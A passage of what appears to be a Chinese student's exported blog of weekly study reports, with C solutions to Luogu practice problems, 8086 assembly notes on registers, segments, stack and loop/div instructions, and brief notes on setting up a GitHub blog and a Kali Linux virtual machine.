class="built_in">printf</span>(<span class="string">&quot;type a name:   &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,name);</span><br><span class="line">		getchar();</span><br><span class="line">			<span class="keyword">while</span>(p1-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="built_in">strcmp</span>(name,p1-&gt;name)!=<span class="number">0</span>)&#123;</span><br><span class="line">				p1=p1-&gt;next;</span><br><span class="line">				num++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,num);</span><br><span class="line">				flag=<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;not found\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(num==<span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;type a number:   &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">		<span class="keyword">while</span>(i!=num&amp;&amp;p1-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">			p1=p1-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(p1-&gt;next==<span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;wrong number&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,p1-&gt;name);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最开始写的时候把num和name[10]放在一个共用体里，没考虑到共用体里只能有一个成员有值…</p>
<h2 id="3-汇编语言学习：">3.汇编语言学习：</h2>
<h3 id="1-存储单元：">1-存储单元：</h3>
<pre><code>bit（一个二进制位），8位bit，8个bit组成一个byte（字节）
</code></pre>
<h3 id="2-cpu对存储器的读写：">2-cpu对存储器的读写：</h3>
<p>和外部器件进行三类信息交互：</p>
<pre><code>	1.存储单元的地址（地址信息）；
	2.器件的选择，读或写（控制信息）；
	3.读或写的数据（数据信息）；
cpu通过总线传输信息，总线分为：地址，， 控制，， 数据，，
一个cpu有n根地址线，可一次传送n位二进制数据，地址总线宽度为n，
这样的cpu 最多可以对2^n个内存单元进行寻址
控制总线  ：“读信号输出”	“写信号输出”
</code></pre>
<p>存储器芯片：</p>
<pre><code>读写属性：随机存储器（ram）只读存储器（rom）
功能和连接：
	随机存储器，存放供cpu使用的绝大部分程序和数据
	接口卡上的ram，如显存
	装有bios的rom（在主板和各类接口卡上，如显卡，网卡）
</code></pre>
<p>内存地址空间：<br>
内存地址空间地址段分配<br>
基于硬件系统编程必须知道这个系统中的内存地址空间分配情况，想在某类存储器中读写数据的时候必须知道它的第一个单元的地址和最后一个单元的地址<br>
<img src="https://img-blog.csdnimg.cn/20191205180311107.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="3-汇编指令：">3-汇编指令：</h3>
<p>不区分大小写</p>
<p>mov ah,78		==		将18送入寄存器ax<br>
mov ax,bx 		==		将寄存器bx中的数据送入寄存器ax<br>
add ax,bx		==		将ax和bx中的数值相加，结果存在ax中</p>
<p>ax中数值为00C5H，执行add al，93H 后，ax中数据为：0058H，不为0058H，因为此时al是作为一个独立的8位寄存器，与ah没有关系。</p>
<p>8086cpu<br>
16位结构（16位机、字长为16位）：<br>
1.运算器一次最多可以处理16位的数据<br>
2.寄存器的最大宽度为16位<br>
3.运算器和寄存器之间的通路为16位</p>
<p>两个16位地址（段地址、偏移地址）合成一个20位物理地址<br>
段地址和偏移地址通过内部总线送入地址加法器，合成后通过内部总线–&gt;输入输出控制电路–&gt;地址总线–&gt;存储器<br>
地址加法器中，物理地址=段地址 *16+偏移地址<br>
（段地址 *16表现为16进制时向左移一位，2进制时移动4位）<br>
（一个x进制的数据向左移动n位，相当于乘以x^n)</p>
<p>内存没有分段，段的划分来自于cpu，cpu可以用不同段地址和偏移地址形成同一个物理地址<br>
对于8086pc机，“数据在21F60H内存单元中”=“数据存在内存2000：1F60单元中”=“数据存在内存的2000H段中的1F60H单元中”</p>
<h3 id="4-段寄存器（segment-register）">4.-段寄存器（segment register）</h3>
<p>提供段地址<br>
6个段寄存器：<br>
cs（code）<br>
ds（data）<br>
ss（stack）<br>
es（extra）<br>
*32位：fs（flag）gs（global）</p>
<h3 id="5-CS、IP">5-CS、IP</h3>
<p>cs为代码段寄存器，IP为指令指针寄存器<br>
物理地址=CS *16+IP</p>
<p>cpu读取指令后，指令进入指令缓冲器，IP的值自动增加，增加长度等于当前读入指令长度</p>
<p>cpu刚开始工作时，CS=FFFFH,IP=0000H,即从FFFF0H单元读取指令执行。<br>
改变CS、IP的值的指令统称为转移指令，如jmp<br>
同时修改CS、IP:jmp 段地址:偏移地址<br>
只修改IP:jmp 某一合法寄存器（如ax/bx）在含义上好似： mov IP,ax</p>
<h3 id="6-字单元：">6-字单元：</h3>
<p>存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元组成，高地址内存单元中存放字型数据的高位字节，，，，，<br>
起始地址为n的字单元简称为n地址字单元</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.01.19-2020.02.02</title>
    <url>/17577.html</url>
    <content><![CDATA[<h3 id="1-用github搞了博客">1.用github搞了博客</h3>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFzdC5haS8yMDIwLzAxLzE2L2Zhc3RfdGVtcGxhdGUv">https://www.fast.ai/2020/01/16/fast_template/<i class="fa fa-external-link-alt"></i></span><br>
并用了他的模板…<br>
页面还没改完</p>
<h3 id="2-汇编语言学习">2.汇编语言学习</h3>
<h5 id="BX-和loop指令">[BX]和loop指令</h5>
<p>一次执行完循环的过程：<br>
g指令：<br>
“g 0012”从当前的cs：ip指向的指令执行，一直到（ip）=0012为止<br>
p指令：<br>
直到（cx）=0为止</p>
<h5 id="段前缀：">段前缀：</h5>
<p>在访问内存单元的指令中显式低给出内存单元段地址所在的段寄存器，如：<br>
mov ax,ds:[bx]<br>
mov ax,cs:[bx]<br>
mov ax,ss,[bx]<br>
mov ax,ex,[0]<br>
…</p>
<span id="more"></span>
<h5 id="在代码段中使用数据">在代码段中使用数据</h5>
<p>code segment<br>
“dw 0123，0456”<br>
…<br>
dw的含义是定义字型数据，因为用dw定义的数据出于代码段的最开始，所以偏移地址为0，这两个数据就在代码段的偏移0，2 处，地址为cs:0,cs:2</p>
<h5 id="将数、代码、栈放入不同的段">将数、代码、栈放入不同的段</h5>
<p>一个段的容量不能大于64kb（8086模式的限制）</p>
<blockquote>
<p>assume cs:code,ds:data,ss:stack<br>
data segment<br>
dw 0123h,0456h,0789h,0abch,0defh,0cbah,0987h<br>
data ends<br>
stack segment<br>
dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0<br>
stack ends<br>
code segment<br>
start: mov ax,==stack==<br>
mov ss,ax<br>
mov sp:20h<br>
mov ax,==data==  ;将名称为data的段的段地址送入ax（数值）<br>
mov ds,ax<br>
mov bx,0<br>
mov cx,8<br>
s:	push [bx]<br>
add bx,2<br>
loop s<br>
mov bx,0<br>
mov cx,8<br>
s0:	pop [bx]<br>
add bx,2<br>
loop s0<br>
mov ax,4c00h<br>
int 21h<br>
code ends<br>
end start</p>
</blockquote>
<h5 id="and-和-or-指令">and 和 or 指令</h5>
<p>and：按位进行与运算<br>
mov al，01100011B<br>
and al，001111011B<br>
or：按位进行或运算<br>
…<br>
or al，00111011B</p>
<h5 id="以字符形式给出的数据">以字符形式给出的数据</h5>
<p>用’…'的方式指明数据是以字符形式给出的，编译器将把它们转化为对应的ascii码<br>
db ‘unix’ 相当于 db 75h,6eh,49h,58h (ascii 码)</p>
<h5 id="bx-idata">[bx+idata]</h5>
<p>mov ax,[200+bx]==mov ax,[bx+200]==mov ax,200[bx]==mov ax,[bx].200<br>
(ax)=((ds)*16+(bx)+200)<br>
用[bx+idata]的方式进行数组的处理</p>
<h5 id="SI、DI">SI、DI</h5>
<p>是和bx功能相近的寄存器，不能够分成两个8位寄存器来使用<br>
可以使用 [bx+si+idata]和[bx+di+idata]的方式表示内存单元，不能用[si+di]</p>
<h6 id="BP">BP</h6>
<p>在8086cpu中只有 si、di、bp、bx四个寄存器能在[…]里进行内存单元的寻址<br>
四个寄存器可以单个出现或只能出现：bx+si;bx+di;bp+si;bp+di。bx+b；si+di是错的<br>
只要使用了bp而没有给出段地址，段地址就默认在ss中</p>
<h6 id="数据位置的表达">数据位置的表达</h6>
<p>1.直接用立即数idata表示：mov ax,1；mov al,‘a’<br>
2.将数据存在寄存器中<br>
3.要处理的数据在内存中，可用[…]的格式给出EA,SA在某个段寄存器中</p>
<ul>
<li>1.mov ax,[bx+si+8]中 段地址默认在ds中</li>
<li>2.mov ax,[bp+si+8]中 段地址默认在ss中</li>
<li>存放段地址的寄存器也可以显性给出：mov ax,ds:[bx+si+8]</li>
</ul>
<h6 id="指令要处理的数据的尺寸">指令要处理的数据的尺寸</h6>
<ul>
<li>1.通过寄存器名指明：ax 字，al/ah 字节</li>
<li>2.用操作符_word/byte__ptr<br>
inc word ptr [bx]<br>
add byte ptr [bx],2<br>
否则cpu无法得知要访问的单元是字单元还是字节单元</li>
<li>3.其他<br>
如push,[1000]</li>
</ul>
<h4 id="寄存器整理">寄存器整理</h4>
<h6 id="bx、si、di、bp：">bx、si、di、bp：</h6>
<p>不使用bp时段地址默认在ds中<br>
使用bp时段地址默认在ss中</p>
<h6 id="dx：累加寄存器">dx：累加寄存器</h6>
<h6 id="cs：代码">cs：代码</h6>
<h6 id="ss-sp：栈顶">ss:sp：栈顶</h6>
<h6 id="ds：数据">ds：数据</h6>
<h6 id="cx：loop">cx：loop</h6>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2019.12.08-2019.12.14</title>
    <url>/2598.html</url>
    <content><![CDATA[<h1>2019.12.08~2019.12.14学习报告</h1>
<hr>
<h2 id="1-洛谷-P1296-奶牛的耳语">1.洛谷-P1296 奶牛的耳语</h2>
<p><img src="https://img-blog.csdnimg.cn/20191214140215863.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n,d;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;n,&amp;d);</span><br><span class="line">	<span class="keyword">int</span> a[n];</span><br><span class="line">	<span class="keyword">int</span> g=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> temp;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(a[j]&lt;a[i])&#123;</span><br><span class="line">				temp=a[i];</span><br><span class="line">				a[i]=a[j];</span><br><span class="line">				a[j]=temp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;i++)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>((a[j]-a[i])&lt;=d)&#123;</span><br><span class="line">				g++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,g);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果两个测试点超时了<br>
艳玲学姐说是冒泡的时间复杂度高，要用快排</p>
<span id="more"></span>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inc</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> * a,<span class="keyword">const</span> <span class="keyword">void</span> *b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> * (<span class="keyword">int</span> * )a-* (<span class="keyword">int</span> *)b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">	qsort(a,n, <span class="keyword">sizeof</span>(<span class="keyword">int</span>),inc);</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
<p>了解了一下快排<br>
感觉很神奇</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvUFFMQzdxRmpiNzRrdDZQZEV4UDhtdw==">漫画：什么是快速排序？（完整版）<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="2-汇编语言学习">2.汇编语言学习</h2>
<h3 id="ds和-address">ds和[address]</h3>
<blockquote>
<p>将1000：0中的数据读到al中：</p>
<p>mov bx,1000H<br>
mov ds,bx<br>
mov al,[0]</p>
</blockquote>
<p>[…]里表示的是偏移地址，执行第三条指令时cpu自动取ds中的数据作为内存单元的段地址</p>
<p>ds是段寄存器，不能用mov ds,1000H，只能用一个寄存器进行中转。</p>
<h3 id="mov-add-sub指令">mov add sub指令</h3>
<p>mov/sub/add 寄存器，数据<br>
mov/sub/add 寄存器，寄存器<br>
mov/sub/add 寄存器&lt;----&gt;内存单元</p>
<p>mov 段寄存器&lt;----&gt;寄存器<br>
mov 内存单元&lt;----&gt;段寄存器</p>
<p>sub和add 不能对段寄存器操作</p>
<h3 id="栈：">栈：</h3>
<p>入栈：将一个新的元素放到栈顶<br>
出栈：从栈顶取出一个元素<br>
栈顶的元素总是最后入栈，需要出栈时又最先被从栈中取出</p>
<h4 id="栈机制：">栈机制：</h4>
<p>都以字为单位进行<br>
push 入栈<br>
pop 出栈<br>
高地址单元存放高8位，低地址单元存放低8位</p>
<p>cpu如何知道某段空间被当作栈来使用？------栈顶的段地址存放在段寄存器SS中。<br>
cpu如何知道哪个单元时栈顶单元？------偏移地址存放在寄存器SP中。</p>
<p>push ax 执行时：</p>
<ol>
<li>sp=sp-2，ss：sp只想当前栈顶前面的单元，以当前栈顶前面的单元为新栈顶</li>
<li>将ax中的内容送入ss：sp指向的内存单元处</li>
</ol>
<p>栈空，ss：sp指向占空间最高地址单元的下一个单元：<br>
如果将10000H~1000FH这段空间当作栈，此时ss=1000，sp=0010</p>
<h4 id="栈顶超界：">栈顶超界：</h4>
<p>push：sp=sp-2，将栈空间外的数据覆盖<br>
pop：sp=sp+2，再push后将栈空间外的数据覆盖</p>
<h4 id="push、pop指令">push、pop指令</h4>
<ul>
<li>push：先改变sp，后向ss：sp传送</li>
<li>pop：先读取ss：sp处数据，后改变sp</li>
</ul>
<p>栈顶变化范围最大为0~FFFFH<br>
栈空：sp=0<br>
栈满：sp=0</p>
<p>pop后栈内数据不变化</p>
<h2 id="3-搭kali">3.搭kali</h2>
<p>1.下载并安装VMware Workstation pro、下载Kali Linux 64-bit VMware<br>
2.打开虚拟机<img src="https://img-blog.csdnimg.cn/2019121415301690.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
3.浏览网页的时候发现中文不能显示，就按照<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2R1c3RfaGsvYXJ0aWNsZS9kZXRhaWxzLzEwMzI5OTEzNg==">解决kali-2019.4中文乱码问题<i class="fa fa-external-link-alt"></i></span>解决了</p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.01.12-2020.01.18</title>
    <url>/19661.html</url>
    <content><![CDATA[<h1>2020.1.12-2020.1.18</h1>
<hr>
<h3 id="1-scanf、getchar、getch、getche和缓冲区">1.scanf、getchar、getch、getche和缓冲区</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xMzU0OTgz">https://cloud.tencent.com/developer/article/1354983<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vbGFuaGFpY29kZS9wLzEwNTc1MDQ5Lmh0bWw=">https://www.cnblogs.com/lanhaicode/p/10575049.html<i class="fa fa-external-link-alt"></i></span></p>
<blockquote>
<p>读取字符时：<br>
(1)scanf()以 Enter 结束一次输入，不会舍弃最后的回车符（即回车符会残留在缓冲区中）；<br>
(2)getchar()以 Enter 结束输入，不会舍弃最后的回车符。<br>
读取字符串时：<br>
(1) scanf()以Space、Enter、Tab结束一次输入，不会舍弃最后的回车符；<br>
(2) gets()以Enter结束输入（空格不结束），接受空格，会舍弃最后的回车符！<br>
所以读取一个字符串中的每一个字符的时候，往往使用getchar()而不使用scanf()，因为一个字符串中是会出现空格的。如果使用scanf()会造成将一个字符串首先读入第一个空格前的部分，其余部分会残留在输入缓冲区的情况，在下次读取时可能会出现错误。<br>
其次为了避免出现上述问题，必须要在读取输入前，清空缓冲区的残留数据</p>
</blockquote>
<span id="more"></span>
<p>缓冲区是一块内存空间，用来缓存数据，目的是让快速的cpu不必等待慢速的输入输出设备，同时减少操作硬件的次数</p>
<p>根据数据刷新的时机可将缓冲区类型分为<br>
1.全缓冲：当缓冲区被填满以后才进行真正的输入输出操作<br>
2.行缓冲：当输入或输出时遇到换行符时才进行真正的输入输出操作<br>
3.无缓冲：没有缓冲区，立即进行输入输出</p>
<p>Windows下c语言的printf是无缓冲的</p>
<h3 id="2-洛谷">2.洛谷</h3>
<h5 id="1-P1597-语句解析">1.P1597-语句解析</h5>
<p><img src="https://img-blog.csdnimg.cn/20200117224034766.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
没有啥思路就看题解了<br>
因为scanf成功读入一个返回值为1，读入两个返回值为2，可以此作为循环条件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">3</span>];</span><br><span class="line">	<span class="keyword">char</span> c1,c2;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">scanf</span>(<span class="string">&quot;%c:=%c;&quot;</span>,&amp;c1,&amp;c2)==<span class="number">2</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span>(c2&gt;<span class="string">&#x27;0&#x27;</span>&amp;&amp;c2&lt;<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">			a[c1-<span class="string">&#x27;a&#x27;</span>]=c2-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			a[c1-<span class="string">&#x27;a&#x27;</span>]=a[c2-<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%d %d %d&quot;</span>,a[<span class="number">0</span>],a[<span class="number">1</span>],a[<span class="number">2</span>]);</span><br><span class="line"><span class="comment">//	char a=14;</span></span><br><span class="line"><span class="comment">//	int b;</span></span><br><span class="line"><span class="comment">//	b=a;</span></span><br><span class="line"><span class="comment">//	printf(&quot;%d&quot;,b);</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="2-P1739-表达式括号匹配">2.P1739-表达式括号匹配</h5>
<p><img src="https://img-blog.csdnimg.cn/20200117223137978.bmp?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0JydWlzaGk=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>
第一次提交了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> b;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;b);</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">			i++;</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">			j++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(j==i)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>没考虑到右括号在左括号旁边的情况 如：)(a+1)*(a+2)(@<br>
看了一下题解：<br>
<strong>每出现一个左括号+1，每出现一个右括号且该变量大于0时-1.最后整个字符串判断完之后如果这个变量值为0则原表达式是匹配的。</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;b);</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">			i++;</span><br><span class="line">			c++;</span><br><span class="line">		&#125;</span><br><span class="line">			</span><br><span class="line">		<span class="keyword">if</span>(b==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">			j++;</span><br><span class="line">			<span class="keyword">if</span>(c&gt;<span class="number">0</span>)</span><br><span class="line">				c--;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(j==i&amp;&amp;c==<span class="number">0</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>通过了</p>
<h3 id="3-汇编语言学习">3.汇编语言学习</h3>
<h6 id="栈段">栈段</h6>
<p>栈顶的变化范围是0~ffff，栈空时sp=0，栈满时sp也=0，一个栈容量最大为64kb<br>
执行修改栈段寄存器ss的指令时，下一条指令也紧接着被执行<br>
如 用t命令执行 mov ss，ax时，下一条mov sp，10也紧接着执行了</p>
<h6 id="一个源程序从写出到执行的过程">一个源程序从写出到执行的过程</h6>
<ol>
<li>编写汇编源程序，产生了一个存储源程序的文本文件</li>
<li>用汇编语言编译程序编译源程序，产生目标文件，再用连接程序对目标文件进行连接，生成可执行文件<br>
可执行文件包1.含程序（机器码）和数据，2.相关描述信息，如程序有多大，要占用多少内存空间等</li>
<li>执行可执行文件中的程序</li>
</ol>
<h6 id="源程序">源程序</h6>
<p>例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"> codesg segment</span><br><span class="line"> 	mov ax,0123</span><br><span class="line"> 	mov bx,0456</span><br><span class="line"> 	add ax,bx</span><br><span class="line"> 	add ax,ax</span><br><span class="line"> 	</span><br><span class="line"> 	mov ax,4c00</span><br><span class="line"> 	int 21</span><br><span class="line"> 	</span><br><span class="line"> codesg ends</span><br><span class="line"> end</span><br></pre></td></tr></table></figure>
<ol>
<li>伪指令<br>
1。<code>xxx segment\n····\nxxx ends</code><br>
是必须使用到的一对伪指令，功能是定义一个段，xxx是段名<br>
一个汇编程序是由多个段组成的，这些段被用来存放代码/数据/当作栈空间用<br>
一个汇编程序中至少要有一个段用来存放代码<br>
段名（xxx）最终将被处理为一个段的段地址<br>
2。<code>end</code><br>
是一个汇编程序的结束标记<br>
3。<code>assume</code><br>
假设某一段寄存器和程序中的某一个用 segment…ends定义的段相关联，如例中段codesg和cpu中的段寄存器cs联系起来</li>
</ol>
<h6 id="bx-和loop指令">[bx]和loop指令</h6>
<ol>
<li>[bx]<br>
要完整地描述一个内存单元，需要两种信息：1。内存单元的地址；2.内存单元的长度（类型）（有多大）<br>
mov al（ax）,[bx]   ：<br>
将一个内存单元的内容送入al（ax），这个内存单元的长度为1（2）字节，存放一个字节（一个字），偏移地址在bx中，段地址在ds中。</li>
<li>loop<br>
用loop指令实现循环功能，cx中存放循环次数<br>
执行loop指令的时候，1.（cx）=（cx)-1 ; 2.判断（cx），不为零则转至标号处执行程序，如果为零则向下执行<br>
``  例：计算2^12</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br><span class="line">code segment </span><br><span class="line">	mov ax,2</span><br><span class="line">	</span><br><span class="line">	mov cx,11</span><br><span class="line">s:	add ax,ax</span><br><span class="line">	loop s</span><br><span class="line">	</span><br><span class="line">	mov ax,4c00h</span><br><span class="line">	int 21h</span><br><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.02.03-2020.02.09</title>
    <url>/7089.html</url>
    <content><![CDATA[<p>这周学得比较少因为刚把输入法从全拼换成双拼在练习打字…</p>
<h2 id="1-搞博客">1.搞博客</h2>
<ul>
<li>在博客里加入了点效果（小声 bb：以前觉得应该挺复杂的，其实有了轮子之后也就一行代码的事啊）<br>
参考：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1ZpbmNlbnRHYXJyZWF1L3BhcnRpY2xlcy5qcw==">https://github.com/VincentGarreau/particles.js<i class="fa fa-external-link-alt"></i></span> -了解了 GitHub 上博客的结构<br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vRWFnbGVyeS9wLzUxMjYyNzkuaHRtbA==">使用 GitHub,Jekyll 打造自己的免费独立博客<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<span id="more"></span>
<h2 id="2-汇编语言学习">2.汇编语言学习</h2>
<h3 id="div-指令">div 指令</h3>
<ul>
<li>div 是除法指令 -除数：有 8 位和 16 位两种，在一个寄存器或内存单元中 -被除数：默认放在 ax 或 dx 和 ax 中<br>
如果除数为 8 位，则被除数为 16 位，默认放在 ax 中存放<br>
如果除数为 16 位，则被除数位 32 位，在 dx 和 ax 中存放，dx 存放高 16 位，ax 存放低 16 位 -结果：<br>
除数为 8 位（16^2-1=255)，al 储存商，ah 储存余数<br>
除数为 16 位(16^4-1=65535)，ax 储存商，dx 储存余数</li>
</ul>
<p>divbyteptrds:[0]含义：<br>
~(al)=(ax)/((ds)*16+0)的商<br>
(ah)=(ax)/((ds)*16+0)的余数</p>
<p>divwordptr[bx+si+8]含义：<br>
~(ax)=[(dx)*10000h+(ax)]/((ds)*16+(bx)+(si)+8)的商<br>
